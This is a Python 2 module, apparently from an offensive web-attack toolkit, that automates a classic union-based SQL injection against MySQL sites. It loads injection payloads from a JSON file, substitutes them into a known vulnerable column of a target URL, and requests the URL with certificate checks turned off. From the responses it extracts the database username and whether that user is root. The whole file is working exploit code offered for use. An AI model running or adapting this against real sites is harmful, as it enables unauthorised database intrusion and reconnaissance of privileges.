try:
    import requests
    import json
    import re
    from time import sleep


    from Config.WebConfig import define_headerdata
except Exception as error:
    raise SystemExit, "we have problem with importing the libraries: %s" % error


class GetUserDBInfos:
    def __init__(self, url=None, vulnerableColumns=None):
        self.url = url
        self.vulnerableColumns = vulnerableColumns[0]

    def get_username(self):
        with open('./WebAttack/sqlinjection/modules/exploit/classicmethods/mysql/staticpaloads/getUserDatabase.json') \
                as file:

            data_extracted = list()

            payloads = json.load(file)

            for item in payloads['payloads']['username']:
                response = requests.get(url=self.url.replace(self.vulnerableColumns, item) + " %23",
                                        headers=define_headerdata, verify=False
                                        )

                if response.content.find("'2134115356'") is not -1:
                    end = re.search("'2134115356'", response.content).end()
                    start = re.search("'62134115356'", response.content).start()
                    data_extracted.append(response.content[end:start])
                    break

                sleep(1)

            return data_extracted

    def get_user_permission(self):

        # todo -> import user permission commands payloads
        with open('./WebAttack/sqlinjection/modules/exploit/classicmethods/mysql/staticpaloads/getUserDatabase.json') \
                as file:

            data_extracted = list()

            payloads = json.load(file)

            for item in payloads['payloads']['permission']:
                response = requests.get(url=self.url.replace(self.vulnerableColumns, item) + " %23",
                                        headers=define_headerdata, verify=False
                                        )

                if response.content.find("'2134115356'") is not -1:
                    end = re.search("'2134115356'", response.content).end()
                    start = re.search("'62134115356'", response.content).start()
                    data_extracted.append(response.content[end:start])
                    break
                else:
                    return "user"

                sleep(1)

            return data_extracted


def userInfos(url=None, vulnerableColumns=None):
    getDatabaseInfos = GetUserDBInfos(url=url, vulnerableColumns=vulnerableColumns)

    userInfo = dict()

    userInfo['user-username'] = getDatabaseInfos.get_username()

    userPermission = getDatabaseInfos.get_user_permission() if getDatabaseInfos.get_user_permission() is not \
                                                               len(getDatabaseInfos.get_user_permission()) == 0 else \
        getDatabaseInfos.get_username()

    if userPermission[0].find('root') is not -1:
        userInfo['user-permission'] = ["root"]
    else:
        userInfo['user-permission'] = ["user"]

    return userInfo
